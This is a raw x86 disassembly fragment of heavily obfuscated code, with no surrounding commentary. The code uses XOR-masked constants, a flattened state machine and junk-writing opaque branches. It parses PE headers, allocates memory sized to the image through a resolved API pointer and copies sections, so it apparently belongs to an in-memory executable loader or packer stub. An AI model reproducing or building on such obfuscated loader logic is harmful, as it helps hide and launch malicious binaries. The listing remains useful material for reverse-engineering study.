  427db2:	mov    eax,DWORD PTR [eax+0x190]
  427db8:	mov    eax,DWORD PTR [eax]
  427dba:	sub    esp,0x64
  427dbd:	push   ebx
  427dbe:	push   esi
  427dbf:	push   edi
  427dc0:	mov    edi,0x75108a4
  427dc5:	xor    ecx,edi
  427dc7:	mov    ebx,0x3272ec
  427dcc:	add    ecx,ebx
  427dce:	cmp    ecx,edx
  427dd0:	jne    0x427de1
  427dd2:	or     DWORD PTR ds:0x3750c3e,0x4263eb2f
  427ddc:	jmp    0x4282dd
  427de1:	mov    ecx,DWORD PTR [ebp+0x8]
  427de4:	mov    esi,DWORD PTR [ebp+0x14]
  427de7:	mov    edx,DWORD PTR [esi]
  427de9:	xor    ecx,edi
  427deb:	add    ecx,ebx
  427ded:	cmp    edx,ecx
  427def:	je     0x428298
  427df5:	mov    ecx,DWORD PTR [ebp+0x1c]
  427df8:	mov    DWORD PTR [ebp-0x1c],eax
  427dfb:	mov    DWORD PTR [ebp+0x1c],ecx
  427dfe:	mov    ecx,DWORD PTR [ebp+0x18]
  427e01:	mov    eax,DWORD PTR [esi]
  427e03:	mov    DWORD PTR [ebp-0x20],eax
  427e06:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  427e0d:	mov    edx,0xf89c85b1
  427e12:	mov    DWORD PTR [ebp-0x8],edx
  427e15:	mov    eax,DWORD PTR [ebp+0x1c]
  427e18:	mov    DWORD PTR [ebp+0x1c],eax
  427e1b:	mov    eax,DWORD PTR [ebp+0x1c]
  427e1e:	mov    eax,DWORD PTR [eax+0x190]
  427e24:	mov    eax,DWORD PTR [eax]
  427e26:	mov    DWORD PTR [ebp-0x24],ecx
  427e29:	mov    ecx,DWORD PTR [ebp+0x1c]
  427e2c:	mov    ecx,DWORD PTR [ecx+0x190]
  427e32:	mov    ecx,DWORD PTR [ecx]
  427e34:	add    ecx,DWORD PTR [eax+0x3c]
  427e37:	mov    DWORD PTR [ebp+0x10],ecx
  427e3a:	mov    eax,DWORD PTR [ebp+0x8]
  427e3d:	xor    eax,edi
  427e3f:	add    eax,ebx
  427e41:	mov    DWORD PTR [ebp-0x4],eax
  427e44:	mov    eax,DWORD PTR [ebp+0x8]
  427e47:	xor    eax,edi
  427e49:	add    eax,ebx
  427e4b:	mov    DWORD PTR [ebp+0x18],eax
  427e4e:	mov    eax,DWORD PTR [ebp+0x10]
  427e51:	mov    eax,DWORD PTR [eax+0x50]
  427e54:	sub    eax,0xc
  427e57:	mov    DWORD PTR [ebp-0x28],eax
  427e5a:	mov    eax,DWORD PTR [ebp+0x10]
  427e5d:	mov    eax,DWORD PTR [eax+0x38]
  427e60:	mov    ecx,DWORD PTR [ebp+0x10]
  427e63:	dec    eax
  427e64:	test   DWORD PTR [ecx+0x54],eax
  427e67:	mov    eax,DWORD PTR [ebp+0x10]
  427e6a:	je     0x427e84
  427e6c:	mov    eax,DWORD PTR [eax+0x38]
  427e6f:	mov    ecx,DWORD PTR [ebp+0x10]
  427e72:	mov    ecx,DWORD PTR [ecx+0x54]
  427e75:	dec    eax
  427e76:	not    eax
  427e78:	and    ecx,eax
  427e7a:	mov    eax,DWORD PTR [ebp+0x10]
  427e7d:	mov    eax,DWORD PTR [eax+0x38]
  427e80:	add    eax,ecx
  427e82:	jmp    0x427e87
  427e84:	mov    eax,DWORD PTR [eax+0x54]
  427e87:	mov    DWORD PTR [ebp+0x1c],eax
  427e8a:	mov    eax,DWORD PTR [ebp+0x8]
  427e8d:	xor    eax,edi
  427e8f:	add    eax,ebx
  427e91:	mov    DWORD PTR [ebp+0x18],eax
  427e94:	mov    eax,DWORD PTR [ebp+0x8]
  427e97:	xor    eax,edi
  427e99:	add    eax,ebx
  427e9b:	mov    DWORD PTR [ebp+0x18],eax
  427e9e:	mov    eax,DWORD PTR [ebp+0x8]
  427ea1:	mov    ecx,DWORD PTR [ebp-0x24]
  427ea4:	xor    eax,edi
  427ea6:	add    eax,ebx
  427ea8:	mov    DWORD PTR [ecx],eax
  427eaa:	mov    DWORD PTR [ebp+0x18],edx
  427ead:	mov    DWORD PTR [ebp+0x18],0xf89c85b2
  427eb4:	mov    DWORD PTR [ebp+0x18],0xf89c85b3
  427ebb:	mov    DWORD PTR [ebp+0x18],0xf89c85bc
  427ec2:	mov    eax,DWORD PTR [ebp-0x8]
  427ec5:	mov    ecx,DWORD PTR [ebp+0x1c]
  427ec8:	xor    eax,edi
  427eca:	add    eax,ebx
  427ecc:	imul   eax,ecx
  427ecf:	mov    ecx,DWORD PTR [ebp+0x8]
  427ed2:	mov    edx,DWORD PTR [ebp-0x28]
  427ed5:	xor    ecx,edi
  427ed7:	lea    ecx,[ecx+edx*1+0x3272ec]
  427ede:	cmp    eax,ecx
  427ee0:	jae    0x428291
  427ee6:	mov    eax,DWORD PTR [ebp+0x8]
  427ee9:	xor    eax,edi
  427eeb:	add    eax,ebx
  427eed:	mov    DWORD PTR [ebp+0x18],eax
  427ef0:	mov    eax,DWORD PTR [ebp+0x1c]
  427ef3:	add    eax,DWORD PTR [ebp-0x1c]
  427ef6:	mov    DWORD PTR [ebp-0x4],eax
  427ef9:	push   DWORD PTR [ebp-0x4]
  427efc:	mov    esi,DWORD PTR [ebp-0x1c]
  427eff:	mov    ecx,DWORD PTR [ebp+0x10]
  427f02:	call   0x427051
  427f07:	mov    DWORD PTR [ebp+0xc],eax
  427f0a:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  427f11:	mov    eax,DWORD PTR [ebp-0x18]
  427f14:	xor    eax,edi
  427f16:	lea    ecx,[ebp-0x40]
  427f19:	add    eax,ebx
  427f1b:	push   ecx
  427f1c:	call   0x4275e5
  427f21:	mov    eax,DWORD PTR [ebp+0xc]
  427f24:	test   eax,eax
  427f26:	je     0x427f76
  427f28:	mov    eax,DWORD PTR [ebp-0x18]
  427f2b:	xor    eax,edi
  427f2d:	add    eax,ebx
  427f2f:	push   eax
  427f30:	push   DWORD PTR [ebp+0xc]
  427f33:	lea    eax,[ebp-0x40]
  427f36:	push   eax
  427f37:	call   0x4274db
  427f3c:	mov    eax,DWORD PTR [ebp-0x4]
  427f3f:	mov    DWORD PTR [ebp-0x18],eax
  427f42:	mov    eax,DWORD PTR [ebp-0x18]
  427f45:	mov    ecx,DWORD PTR [ebp-0x1c]
  427f48:	sub    eax,ecx
  427f4a:	mov    DWORD PTR [ebp-0x18],eax
  427f4d:	mov    eax,DWORD PTR [ebp+0xc]
  427f50:	mov    ecx,DWORD PTR [ebp+0xc]
  427f53:	mov    eax,DWORD PTR [eax+0x10]
  427f56:	add    eax,DWORD PTR [ecx+0xc]
  427f59:	mov    ecx,DWORD PTR [ebp-0x18]
  427f5c:	cmp    ecx,eax
  427f5e:	jb     0x427f76
  427f60:	mov    eax,DWORD PTR [ebp+0xc]
  427f63:	mov    eax,DWORD PTR [eax+0xc]
  427f66:	mov    ecx,DWORD PTR [ebp+0xc]
  427f69:	add    eax,DWORD PTR [ecx+0x8]
  427f6c:	mov    ecx,DWORD PTR [ebp-0x18]
  427f6f:	sub    eax,ecx
  427f71:	jmp    0x428264
  427f76:	push   0xc
  427f78:	push   DWORD PTR [ebp-0x4]
  427f7b:	lea    eax,[ebp-0x4c]
  427f7e:	push   eax
  427f7f:	call   0x4274db
  427f84:	mov    eax,0xf89c85b0
  427f89:	mov    DWORD PTR [ebp-0x2c],eax
  427f8c:	mov    DWORD PTR [ebp-0x30],0xf89c85b1
  427f93:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  427f9a:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  427fa1:	lea    ecx,[ebp-0x2c]
  427fa4:	mov    DWORD PTR [ebp-0xc],ecx
  427fa7:	lea    ecx,[ebp-0x30]
  427faa:	mov    DWORD PTR [ebp-0x10],ecx
  427fad:	lea    ecx,[ebp-0x34]
  427fb0:	mov    DWORD PTR [ebp+0xc],ecx
  427fb3:	lea    ecx,[ebp-0x38]
  427fb6:	mov    DWORD PTR [ebp-0x14],ecx
  427fb9:	mov    ecx,DWORD PTR [ebp+0x8]
  427fbc:	xor    ecx,edi
  427fbe:	add    ecx,ebx
  427fc0:	mov    DWORD PTR [ebp-0x18],ecx
  427fc3:	jmp    0x4281bf
  427fc8:	cmp    eax,0xf89c85b2
  427fcd:	je     0x4281d1
  427fd3:	mov    ecx,DWORD PTR [ebp-0x8]
  427fd6:	xor    ecx,edi
  427fd8:	mov    esi,eax
  427fda:	add    ecx,ebx
  427fdc:	mov    DWORD PTR [ebp+0x18],ecx
  427fdf:	mov    eax,DWORD PTR [ebp-0x18]
  427fe2:	xor    esi,edi
  427fe4:	lea    eax,[eax+esi*1+0x3272ec]
  427feb:	mov    DWORD PTR [ebp-0x18],eax
  427fee:	mov    eax,DWORD PTR [ebp-0x8]
  427ff1:	mov    ecx,DWORD PTR [ebp-0x18]
  427ff4:	xor    eax,edi
  427ff6:	add    eax,ebx
  427ff8:	cmp    ecx,eax
  427ffa:	jne    0x42800f
  427ffc:	mov    eax,DWORD PTR [ebp+0x8]
  427fff:	xor    eax,edi
  428001:	add    eax,ebx
  428003:	push   eax
  428004:	push   0xc
  428006:	lea    eax,[ebp-0x4c]
  428009:	push   eax
  42800a:	call   0x427ac1
  42800f:	mov    eax,DWORD PTR [ebp-0xc]
  428012:	mov    eax,DWORD PTR [eax]
  428014:	xor    eax,edi
  428016:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42801d:	mov    ecx,DWORD PTR [ebp+0x8]
  428020:	xor    ecx,edi
  428022:	movzx  eax,al
  428025:	add    ecx,ebx
  428027:	cmp    eax,ecx
  428029:	je     0x4281a7
  42802f:	mov    eax,DWORD PTR [ebp-0x10]
  428032:	mov    eax,DWORD PTR [eax]
  428034:	xor    eax,edi
  428036:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42803d:	mov    ecx,DWORD PTR [ebp+0x8]
  428040:	xor    ecx,edi
  428042:	movzx  eax,al
  428045:	add    ecx,ebx
  428047:	cmp    eax,ecx
  428049:	je     0x4281a7
  42804f:	mov    eax,DWORD PTR [ebp+0xc]
  428052:	mov    eax,DWORD PTR [eax]
  428054:	xor    eax,edi
  428056:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42805d:	mov    ecx,DWORD PTR [ebp+0x8]
  428060:	xor    ecx,edi
  428062:	movzx  eax,al
  428065:	add    ecx,ebx
  428067:	cmp    eax,ecx
  428069:	je     0x4281a7
  42806f:	mov    eax,DWORD PTR [ebp-0x14]
  428072:	mov    eax,DWORD PTR [eax]
  428074:	xor    eax,edi
  428076:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42807d:	mov    ecx,DWORD PTR [ebp+0x8]
  428080:	xor    ecx,edi
  428082:	movzx  eax,al
  428085:	add    ecx,ebx
  428087:	cmp    eax,ecx
  428089:	je     0x4281a7
  42808f:	mov    eax,DWORD PTR [ebp-0x10]
  428092:	mov    eax,DWORD PTR [eax]
  428094:	xor    eax,edi
  428096:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42809d:	mov    ecx,DWORD PTR [ebp-0xc]
  4280a0:	mov    ecx,DWORD PTR [ecx]
  4280a2:	xor    ecx,edi
  4280a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4280ab:	xor    al,cl
  4280ad:	mov    ecx,DWORD PTR [ebp+0xc]
  4280b0:	mov    ecx,DWORD PTR [ecx]
  4280b2:	xor    ecx,edi
  4280b4:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4280bb:	or     al,cl
  4280bd:	mov    ecx,DWORD PTR [ebp-0xc]
  4280c0:	mov    ecx,DWORD PTR [ecx]
  4280c2:	xor    ecx,edi
  4280c4:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  4280cb:	cmp    cl,al
  4280cd:	jne    0x4281a7
  4280d3:	mov    eax,DWORD PTR [ebp+0xc]
  4280d6:	mov    eax,DWORD PTR [eax]
  4280d8:	xor    eax,edi
  4280da:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4280e1:	mov    ecx,DWORD PTR [ebp-0x10]
  4280e4:	mov    ecx,DWORD PTR [ecx]
  4280e6:	xor    ecx,edi
  4280e8:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4280ef:	xor    al,cl
  4280f1:	mov    ecx,DWORD PTR [ebp-0x14]
  4280f4:	mov    ecx,DWORD PTR [ecx]
  4280f6:	xor    ecx,edi
  4280f8:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4280ff:	or     al,cl
  428101:	mov    ecx,DWORD PTR [ebp-0x10]
  428104:	mov    ecx,DWORD PTR [ecx]
  428106:	xor    ecx,edi
  428108:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  42810f:	cmp    cl,al
  428111:	jne    0x4281a7
  428117:	mov    eax,DWORD PTR [ebp-0x14]
  42811a:	mov    eax,DWORD PTR [eax]
  42811c:	xor    eax,edi
  42811e:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  428125:	mov    ecx,DWORD PTR [ebp+0xc]
  428128:	mov    ecx,DWORD PTR [ecx]
  42812a:	xor    ecx,edi
  42812c:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  428133:	xor    al,cl
  428135:	mov    ecx,DWORD PTR [ebp-0xc]
  428138:	mov    ecx,DWORD PTR [ecx]
  42813a:	xor    ecx,edi
  42813c:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  428143:	or     al,cl
  428145:	mov    ecx,DWORD PTR [ebp+0xc]
  428148:	mov    ecx,DWORD PTR [ecx]
  42814a:	xor    ecx,edi
  42814c:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  428153:	cmp    cl,al
  428155:	jne    0x4281a7
  428157:	mov    eax,DWORD PTR [ebp-0x14]
  42815a:	mov    eax,DWORD PTR [eax]
  42815c:	xor    eax,edi
  42815e:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  428165:	mov    ecx,DWORD PTR [ebp-0xc]
  428168:	mov    ecx,DWORD PTR [ecx]
  42816a:	xor    ecx,edi
  42816c:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  428173:	xor    al,cl
  428175:	mov    ecx,DWORD PTR [ebp-0x10]
  428178:	mov    ecx,DWORD PTR [ecx]
  42817a:	xor    ecx,edi
  42817c:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  428183:	or     al,cl
  428185:	mov    ecx,DWORD PTR [ebp-0x14]
  428188:	mov    ecx,DWORD PTR [ecx]
  42818a:	xor    ecx,edi
  42818c:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  428193:	cmp    cl,al
  428195:	jne    0x4281a7
  428197:	lea    eax,[ebp-0x4c]
  42819a:	push   eax
  42819b:	call   0x427c62
  4281a0:	mov    ecx,DWORD PTR [ebp-0x44]
  4281a3:	cmp    eax,ecx
  4281a5:	je     0x4281b1
  4281a7:	mov    eax,DWORD PTR [ebp+0x8]
  4281aa:	xor    eax,edi
  4281ac:	add    eax,ebx
  4281ae:	mov    DWORD PTR [ebp+0x18],eax
  4281b1:	mov    eax,DWORD PTR [ebp-0x8]
  4281b4:	xor    eax,edi
  4281b6:	lea    eax,[eax+esi*1+0x3272ec]
  4281bd:	xor    eax,edi
  4281bf:	mov    ecx,DWORD PTR [ebp+0x8]
  4281c2:	mov    edx,DWORD PTR [ebp+0x18]
  4281c5:	xor    ecx,edi
  4281c7:	add    ecx,ebx
  4281c9:	cmp    edx,ecx
  4281cb:	je     0x427fc8
  4281d1:	mov    eax,DWORD PTR [ebp+0x8]
  4281d4:	mov    ecx,DWORD PTR [ebp+0x18]
  4281d7:	xor    eax,edi
  4281d9:	add    eax,ebx
  4281db:	cmp    ecx,eax
  4281dd:	jne    0x4281f0
  4281df:	mov    eax,DWORD PTR [ebp-0x8]
  4281e2:	mov    ecx,DWORD PTR [ebp+0x1c]
  4281e5:	xor    eax,edi
  4281e7:	lea    eax,[eax+ecx*1+0x3272ec]
  4281ee:	jmp    0x428267
  4281f0:	push   0x18
  4281f2:	push   DWORD PTR [ebp-0x4]
  4281f5:	lea    eax,[ebp-0x64]
  4281f8:	push   eax
  4281f9:	call   0x4274db
  4281fe:	mov    eax,DWORD PTR [ebp+0x8]
  428201:	mov    ecx,DWORD PTR [ebp-0x18]
  428204:	xor    eax,edi
  428206:	add    eax,ebx
  428208:	cmp    eax,ecx
  42820a:	je     0x42821f
  42820c:	mov    eax,DWORD PTR [ebp+0x8]
  42820f:	xor    eax,edi
  428211:	add    eax,ebx
  428213:	push   eax
  428214:	push   0x18
  428216:	lea    eax,[ebp-0x64]
  428219:	push   eax
  42821a:	call   0x427ac1
  42821f:	mov    eax,DWORD PTR [ebp-0x4]
  428222:	add    eax,0x18
  428225:	mov    DWORD PTR [ebp+0x18],eax
  428228:	push   DWORD PTR [ebp-0x50]
  42822b:	push   DWORD PTR [ebp+0x18]
  42822e:	mov    eax,DWORD PTR [ebp-0x54]
  428231:	add    eax,DWORD PTR [ebp-0x20]
  428234:	push   eax
  428235:	call   0x4274db
  42823a:	mov    eax,DWORD PTR [ebp+0x8]
  42823d:	mov    ecx,DWORD PTR [ebp-0x18]
  428240:	xor    eax,edi
  428242:	add    eax,ebx
  428244:	cmp    eax,ecx
  428246:	je     0x428259
  428248:	push   0x0
  42824a:	push   DWORD PTR [ebp-0x50]
  42824d:	mov    eax,DWORD PTR [ebp-0x54]
  428250:	add    eax,DWORD PTR [ebp-0x20]
  428253:	push   eax
  428254:	call   0x427ac1
  428259:	mov    eax,DWORD PTR [ebp-0x24]
  42825c:	mov    ecx,DWORD PTR [ebp-0x50]
  42825f:	add    DWORD PTR [eax],ecx
  428261:	mov    eax,DWORD PTR [ebp-0x50]
  428264:	add    eax,DWORD PTR [ebp+0x1c]
  428267:	mov    DWORD PTR [ebp+0x1c],eax
  42826a:	mov    eax,DWORD PTR [ebp-0x8]
  42826d:	mov    ecx,DWORD PTR [ebp+0x1c]
  428270:	xor    eax,edi
  428272:	add    eax,ebx
  428274:	imul   eax,ecx
  428277:	mov    ecx,DWORD PTR [ebp+0x8]
  42827a:	mov    edx,DWORD PTR [ebp-0x28]
  42827d:	xor    ecx,edi
  42827f:	lea    ecx,[ecx+edx*1+0x3272ec]
  428286:	cmp    eax,ecx
  428288:	jb     0x427ee6
  42828e:	mov    esi,DWORD PTR [ebp+0x14]
  428291:	mov    eax,DWORD PTR [ebp-0x20]
  428294:	mov    DWORD PTR [esi],eax
  428296:	jmp    0x4282dd
  428298:	mov    ecx,DWORD PTR [ebp+0x8]
  42829b:	mov    edx,DWORD PTR [ebp+0xc]
  42829e:	xor    ecx,edi
  4282a0:	xor    edx,edi
  4282a2:	add    ecx,ebx
  4282a4:	add    edx,ebx
  4282a6:	cmp    ecx,edx
  4282a8:	jne    0x4282bc
  4282aa:	mov    eax,ds:0x7f642ddf
  4282af:	imul   eax,eax,0x9f15fcce
  4282b5:	mov    ds:0x7f642ddf,eax
  4282ba:	jmp    0x4282dd
  4282bc:	mov    ecx,DWORD PTR [ebp+0x8]
  4282bf:	xor    ecx,edi
  4282c1:	add    ecx,ebx
  4282c3:	cmp    eax,ecx
  4282c5:	je     0x4282d3
  4282c7:	sub    DWORD PTR ds:0xf861e3f,0x709beac1
  4282d1:	jmp    0x4282dd
  4282d3:	and    DWORD PTR ds:0x3343fadf,0x5265ec3e
  4282dd:	pop    edi
  4282de:	pop    esi
  4282df:	pop    ebx
  4282e0:	leave  
  4282e1:	ret    0x18
  4282e4:	push   ebp
  4282e5:	mov    ebp,esp
  4282e7:	and    esp,0xfffffff8
  4282ea:	mov    eax,DWORD PTR [ebp+0x20]
  4282ed:	sub    esp,0x14
  4282f0:	push   ebx
  4282f1:	mov    ebx,DWORD PTR [ebp+0x14]
  4282f4:	push   esi
  4282f5:	push   edi
  4282f6:	cmp    eax,0xf89c85b0
  4282fb:	jne    0x428307
  4282fd:	push   0xf89c85b1
  428302:	jmp    0x428439
  428307:	mov    eax,DWORD PTR [ebp+0x20]
  42830a:	cmp    eax,0xf89c85b1
  42830f:	jne    0x42831b
  428311:	push   0xf89c85b2
  428316:	jmp    0x428439
  42831b:	mov    eax,DWORD PTR [ebp+0x20]
  42831e:	cmp    eax,0xf89c85b2
  428323:	jne    0x42832f
  428325:	push   0xf89c85b3
  42832a:	jmp    0x428439
  42832f:	mov    eax,DWORD PTR [ebp+0x20]
  428332:	cmp    eax,0xf89c85b3
  428337:	jne    0x428343
  428339:	push   0xf89c85bc
  42833e:	jmp    0x428439
  428343:	mov    ecx,DWORD PTR [ebp+0x20]
  428346:	mov    eax,0xf89c85bf
  42834b:	cmp    ecx,eax
  42834d:	jne    0x428409
  428353:	mov    eax,DWORD PTR [ebp+0x10]
  428356:	mov    DWORD PTR [esp+0xc],eax
  42835a:	mov    eax,DWORD PTR [ebp+0x18]
  42835d:	mov    DWORD PTR [esp+0x14],eax
  428361:	mov    eax,DWORD PTR [ebp+0xc]
  428364:	mov    DWORD PTR [esp+0x18],eax
  428368:	mov    eax,DWORD PTR [ebp+0x8]
  42836b:	mov    DWORD PTR [esp+0x10],eax
  42836f:	mov    eax,DWORD PTR [esp+0x10]
  428373:	mov    ecx,DWORD PTR [esp+0x14]
  428377:	mov    edi,0x75108a4
  42837c:	xor    eax,edi
  42837e:	mov    esi,0x3272ec
  428383:	add    eax,esi
  428385:	mov    DWORD PTR [ecx],eax
  428387:	mov    eax,DWORD PTR [esp+0xc]
  42838b:	mov    eax,DWORD PTR [eax+0x194]
  428391:	mov    ecx,DWORD PTR [eax]
  428393:	mov    eax,DWORD PTR [esp+0xc]
  428397:	mov    eax,DWORD PTR [eax+0x194]
  42839d:	mov    eax,DWORD PTR [eax]
  42839f:	add    eax,DWORD PTR [ecx+0x3c]
  4283a2:	mov    ecx,DWORD PTR [esp+0xc]
  4283a6:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4283ac:	mov    ecx,DWORD PTR [ecx+0x14]
  4283af:	push   0x4
  4283b1:	push   0x3000
  4283b6:	push   DWORD PTR [eax+0x50]
  4283b9:	push   0x0
  4283bb:	call   ecx
  4283bd:	mov    DWORD PTR [ebx],eax
  4283bf:	mov    eax,DWORD PTR [esp+0x10]
  4283c3:	push   DWORD PTR [esp+0xc]
  4283c7:	xor    eax,edi
  4283c9:	add    eax,esi
  4283cb:	mov    DWORD PTR [esp+0x20],eax
  4283cf:	lea    eax,[esp+0x20]
  4283d3:	push   eax
  4283d4:	push   ebx
  4283d5:	push   DWORD PTR [esp+0x20]
  4283d9:	push   DWORD PTR [esp+0x28]
  4283dd:	push   DWORD PTR [esp+0x24]
  4283e1:	call   0x427da6
  4283e6:	mov    eax,DWORD PTR [esp+0x10]
  4283ea:	mov    ecx,DWORD PTR [ebx]
  4283ec:	xor    eax,edi
  4283ee:	add    eax,esi
  4283f0:	cmp    ecx,eax
  4283f2:	je     0x428450
  4283f4:	mov    eax,DWORD PTR [esp+0x18]
  4283f8:	mov    ecx,DWORD PTR [esp+0x14]
  4283fc:	xor    eax,edi
  4283fe:	add    eax,esi
  428400:	imul   eax,DWORD PTR [esp+0x1c]
  428405:	mov    DWORD PTR [ecx],eax
  428407:	jmp    0x428450
  428409:	mov    ecx,DWORD PTR [ebp+0x20]
  42840c:	cmp    ecx,0xf89c85bc
  428412:	jne    0x42841b
  428414:	push   0xf89c85bd
  428419:	jmp    0x428439
  42841b:	mov    ecx,DWORD PTR [ebp+0x20]
  42841e:	cmp    ecx,0xf89c85bd
  428424:	jne    0x42842d
  428426:	push   0xf89c85be
  42842b:	jmp    0x428439
  42842d:	mov    ecx,DWORD PTR [ebp+0x20]
  428430:	cmp    ecx,0xf89c85be
  428436:	jne    0x428450
  428438:	push   eax
  428439:	push   DWORD PTR [ebp+0x1c]
  42843c:	push   DWORD PTR [ebp+0x18]
  42843f:	push   ebx
  428440:	push   DWORD PTR [ebp+0x10]
  428443:	push   DWORD PTR [ebp+0xc]
  428446:	push   DWORD PTR [ebp+0x8]
  428449:	call   0x4282e4
  42844e:	mov    DWORD PTR [ebx],eax
  428450:	mov    eax,DWORD PTR [ebx]
  428452:	pop    edi
  428453:	pop    esi
  428454:	pop    ebx
  428455:	mov    esp,ebp
  428457:	pop    ebp
  428458:	ret    0x1c
  42845b:	push   ebp
  42845c:	mov    ebp,esp
  42845e:	sub    esp,0xc
  428461:	mov    eax,0xf89c85b0
  428466:	mov    DWORD PTR [ebp-0x8],eax
  428469:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  428470:	mov    ecx,DWORD PTR [ebp-0x8]
  428473:	xor    ecx,0x75108a4
  428479:	add    ecx,0x3272ec
  42847f:	mov    DWORD PTR [ebp-0x4],ecx
  428482:	mov    ecx,DWORD PTR [ebp+0xc]
  428485:	push   eax
  428486:	mov    DWORD PTR [ebp+0xc],ecx
  428489:	push   DWORD PTR [ebp+0xc]
  42848c:	lea    eax,[ebp-0x4]
  42848f:	push   DWORD PTR [ebp+0x8]
  428492:	push   eax
  428493:	push   DWORD PTR [ebp+0xc]
  428496:	push   DWORD PTR [ebp-0xc]
  428499:	push   DWORD PTR [ebp-0x8]
  42849c:	call   0x4282e4
  4284a1:	mov    DWORD PTR [ebp-0x4],eax
  4284a4:	mov    eax,DWORD PTR [ebp-0x4]
  4284a7:	leave  
  4284a8:	ret    0x8
